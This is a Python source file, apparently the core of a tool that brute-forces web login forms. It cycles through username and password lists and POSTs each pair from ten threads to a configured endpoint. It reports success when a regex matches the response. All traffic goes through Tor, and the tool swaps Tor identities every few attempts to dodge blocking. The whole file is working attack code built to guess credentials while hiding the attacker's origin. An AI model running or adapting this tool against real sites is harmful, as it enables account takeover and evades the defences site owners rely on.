import logging
import re
import time
from configparser import ConfigParser
from multiprocessing import Lock
from multiprocessing.pool import ThreadPool

import requests
from requests.exceptions import ConnectionError, Timeout
from alive_progress import alive_bar

from ..generator import PasswdGenerator, TupleGenerator
from ..onion import TorProxy
from .cli_parser import Args

__all__ = ["App"]


class App:
    MAX_TRIES = 3
    N_PROCESS = 10  #! DO NOT CHANGE THIS VALUE

    def __init__(self, args: Args) -> None:
        self.consecutive_fails = 0
        self.lock = Lock()

        self.count = 0
        self.count_lock = Lock()

        self.logger = logging.getLogger(".".join(__name__.split(".")[1:]))
        self.cfg = ConfigParser()
        self.cfg.read(args.cfg_path)

        self.session = requests.Session()
        self.target = re.compile(self.cfg["url-endpoints"]["target"])
        self.post_url = self.cfg["url-endpoints"]["post_url"]

        self.username_field = self.cfg["html-fields"]["username_field"]
        self.password_field = self.cfg["html-fields"]["password_field"]

        self.username_path = args.usernames
        self.password_path = args.passwords
        self.it_comb = args.it_comb
        self.each = args.each

    def post_search(self, username_field: str, password_field: str) -> bool:
        self.session.cookies.clear_session_cookies()  # todo: benchmark against .clear()
        response: requests.Response = None
        try_no = 0

        # 3 tries to connect to the target
        # connected if some response and status code is 200
        while try_no < self.MAX_TRIES and (not response or response.status_code != 200):
            try:
                response = self.session.post(
                    self.post_url,
                    data={
                        self.username_field: username_field,
                        self.password_field: password_field,
                    },
                    allow_redirects=True,  # maybe new page when successfull login
                    timeout=10,  # 10 seconds
                )
                if response and response.status_code == 200:
                    with self.lock:
                        self.consecutive_fails = 0
            except (ConnectionError, Timeout) as e:
                self.logger.debug(
                    "exception [%s] : retrying ... (%d/%d)",
                    e.__class__.__name__,
                    try_no + 1,
                    self.MAX_TRIES,
                )
                time.sleep(1)  # wait to ~avoid~ spamming
            finally:
                try_no += 1
        else:
            if not response or response.status_code != 200:
                self.logger.error(
                    "failed multiple reconnect to target [%s:%s] ❌",
                    username_field,
                    password_field,
                )
                with self.lock:
                    if self.consecutive_fails >= self.MAX_TRIES:
                        self.logger.critical(
                            "too many consecutive fails, exiting ... ❌"
                        )
                    self.consecutive_fails += 1

        if response and self.target.search(response.text):
            self.logger.info(
                "🎉 Login successful using %s:%s",
                username_field,
                password_field,
            )

    def bar(self, bar, digits: int, user_count: int, passwd_count: int, /):
        should_update_title = False
        with self.count_lock:
            self.count += 1
            if self.count % passwd_count == 0:
                should_update_title = True

        if should_update_title:
            bar.title(self.bar_title(self.count // passwd_count, digits, user_count))
        try:
            bar()
        except RuntimeError:
            # RuntimeError: dictionary changed size during iteration
            #
            # This is because of the `alive_bar` package
            # which uses a dict internally to store the
            # progress bar state.
            #
            # This error is raised when the progress bar
            # is updated while the bar is being rendered.
            #
            # This is not a problem because the progress
            # bar is only used to display the progress
            # and not to store the state.
            #
            # So we just ignore this error.
            pass

    @staticmethod
    def bar_title(i, digits, user_count, /) -> str:
        return f"on user {(i+1):0{digits}}/{user_count}"

    def run(self):
        user = PasswdGenerator(self.username_path, self.it_comb[0])
        passwd = PasswdGenerator(self.password_path, self.it_comb[1])
        generator = TupleGenerator(user, passwd)

        digits = len(str(user.count))  # number of digits in user count
        length = len(self.bar_title(0, digits, user.count))

        self.logger.info("Starting Tor 🧄 session ...")
        with TorProxy() as tor:
            self.session.proxies = {
                "http": f"socks5h://localhost:{tor.port}",  # use Tor for HTTP connections
            }

            with alive_bar(total=generator.count) as bar:
                with ThreadPool(self.N_PROCESS) as pool:
                    for i, u in enumerate(generator):
                        if i % self.each == 0:
                            pool.close()
                            pool.join()
                            bar.title(f"ID Swap ♻️{' '*(length-9)}")
                            tor.identity_swap()
                            # alternative would be to manually terminate and create a new pool
                            # without the "with" statement
                            pool.__init__(self.N_PROCESS)
                            bar.title(
                                self.bar_title(
                                    self.count // passwd.count, digits, user.count
                                )
                            )

                        pool.apply_async(
                            self.post_search,
                            args=(u[0], u[1]),
                            callback=lambda _: self.bar(
                                bar, digits, user.count, passwd.count
                            ),
                        )
                    pool.close()
                    pool.join()

        self.logger.info("Done ✅")
